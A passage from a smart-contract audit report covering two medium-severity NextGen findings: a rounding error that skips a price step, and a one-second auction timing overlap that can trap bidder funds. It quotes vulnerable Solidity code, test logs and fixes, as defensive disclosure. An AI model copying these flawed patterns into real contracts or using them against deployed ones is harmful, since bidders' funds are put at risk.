sec.</p>\n$$\ntDiff = \\frac{10800}{3600} = 3\n$$\n<p>We plug in <code>tDiff</code> and the other variables into the <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553\">if</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (((</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                / (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n$$\n\\frac{0.49 \\times 10^{18} - 0.1 \\times 10^{18}}{0.1 \\times 10^{18}} = \\frac{0.39 \\times 10^{18}}{0.1 \\times 10^{18}} = 3\n$$\n<p>We obtain 3 as the answer, which is due to rounding down, as we divide 0.39 by 0.1. Solidity only works with whole numbers, causing the <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553\">if</a> to fail as <code>3 > 3</code> is false. This leads to entering the else statement where the last price of 0.1 ETH is returned, effectively missing one step of the 4-hour decrease.</p>\n<h3 id=\"poc-4\" style=\"position:relative;\"><a href=\"#poc-4\" aria-label=\"poc 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<p>Gist <a href=\"https://gist.github.com/0x3b33/ab8a384f9979c4a9b7c4777be00a78de\">here</a>.</p>\n<p>Add <code>contracts/=smart-contracts/</code> to mappings and run it with <code>forge test --match-test test_changeProof --lib-paths ../smart-contracts -vv</code>.</p>\n<p>Logs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_changeProof() (gas: 745699)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  4900000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  3900000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  2900000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  1000000000000000000</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A simple yet effective suggestion is to add <code>=</code> in the <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553\">if</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  if (...) &gt; tDiff){ </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  if (...) &gt;= tDiff){ </span></span></span></code></pre>\n<h3 id=\"assessed-type-10\" style=\"position:relative;\"><a href=\"#assessed-type-10\" aria-label=\"assessed type 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Error</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/393#issuecomment-1822845813\">a2rocket (NextGen) confirmed via duplicate issue #393</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/271#issuecomment-1841801838\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden illustrates that a rounding error can result in a price that is lower than the actual one for a particular period.</p>\n<p>The relevant rounding issue has been detected by the bot in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-17-loss-of-precision-on-division\">L-17</a>, however, it is designated as a low-risk finding and the attack path that the Warden illustrates is not immediately clear by consuming the bot report submission. </p>\n<p>The C4 Supreme Court verdict <a href=\"https://docs.google.com/document/d/1Y2wJVt0d2URv8Pptmo7JqNd0DuPk_qF9EPJAj3iSQiE/edit#heading=h.vljs3xbfn8cj\">did not finalize on issues based entirely on bot findings</a> and as such, I will deem this exhibit a valid medium-severity submission given that:</p>\n<ul>\n<li>It takes a low-risk bot report and illustrates that it should be treated as a medium-severity issue that is not immediately discernible by consuming the bot report alone.</li>\n<li>\n<p>The bot reportâ€™s mitigation would not lead to the loss of precision being resolved as it states that:</p>\n<blockquote>\n<p>â€¦itâ€™s recommended to require a minimum numerator amount to ensure that it is always greater than the denominator</p>\n</blockquote>\n</li>\n</ul>\n<p>The Wardenâ€™s submission was selected as the best due to their clear depiction of the issue using mathematical formulas, a provision of both textual and coded PoCs, and a simple remediation path.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-10-bidder-funds-can-become-unrecoverable-due-to-1-second-overlap-in-participatetoauction-and-claimauction\" style=\"position:relative;\"><a href=\"#m-10-bidder-funds-can-become-unrecoverable-due-to-1-second-overlap-in-participatetoauction-and-claimauction\" aria-label=\"m 10 bidder funds can become unrecoverable due to 1 second overlap in participatetoauction and claimauction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/175\">[M-10] Bidder Funds Can Become Unrecoverable Due to 1 second Overlap in <code>participateToAuction()</code> and <code>claimAuction()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/175\">HChang26</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1696\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1659\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1642\">phoenixV110</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1603\">Neon2835</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1576\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1562\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1153\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1094\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1038\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/988\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/962\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/786\">Kow</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/706\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/676\">t0x1c</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/419\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/341\">ubl4nk</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/214\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/82\">oualidpro</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/75\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1926\">0xMAKEOUTHILL</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1915\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1527\">0xSwahili</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1489\">innertia</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1451\">mojito_auditor</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1444\">0xarno</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1371\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1242\">Eigenvectors</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1034\">alexfilippov314</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1030\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/932\">ohm</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/503\">Zac</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/92\">ABA</a></em></p>\n<h3 id=\"lines-of-code\" style=\"position:relative;\"><a href=\"#lines-of-code\" aria-label=\"lines of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57\">https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57</a><br>\n<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104\">https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104</a></p>\n<h3 id=\"impact-4\" style=\"position:relative;\"><a href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Bidder funds may become irretrievable if the <code>participateToAuction()</code> function is executed after <code>claimAuction()</code> during a 1-second overlap.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The protocol allows bidders to use the <code>participateToAuction()</code> function up to the auctionâ€™s end time.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">participateToAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      -&gt;</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">returnHighestBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionEndTime</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionInfoStru</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newBid</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">auctionInfoStru</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>However, the issue arises when an auction winner immediately calls <code>claimAuction()</code> right after the auction concludes, creating a 1-second window during which both <code>claimAuction()</code> and <code>participateToAuction()</code> can be executed.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WinnerOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">,this.claimAuction.selector){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      -&gt;</span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionEndTime</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">auctionClaim</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">false</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auctionClaim</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">returnHighestBid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">returnHighestBidder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The issue arises when <code>claimAuction()</code> is executed before <code>participateToAuction()</code> within this 1-second overlap. In such a scenario, the bidderâ€™s funds will become trapped in <code>AuctionDemo.sol</code> without any mechanism to facilitate refunds. Both <code>cancelBid()</code> and <code>cancelAllBids()</code> functions will revert after the auctionâ€™s conclusion, making it impossible for bidders to recover their funds.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">participateToAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-       </span><span class=\"mtk11\">require</span><span 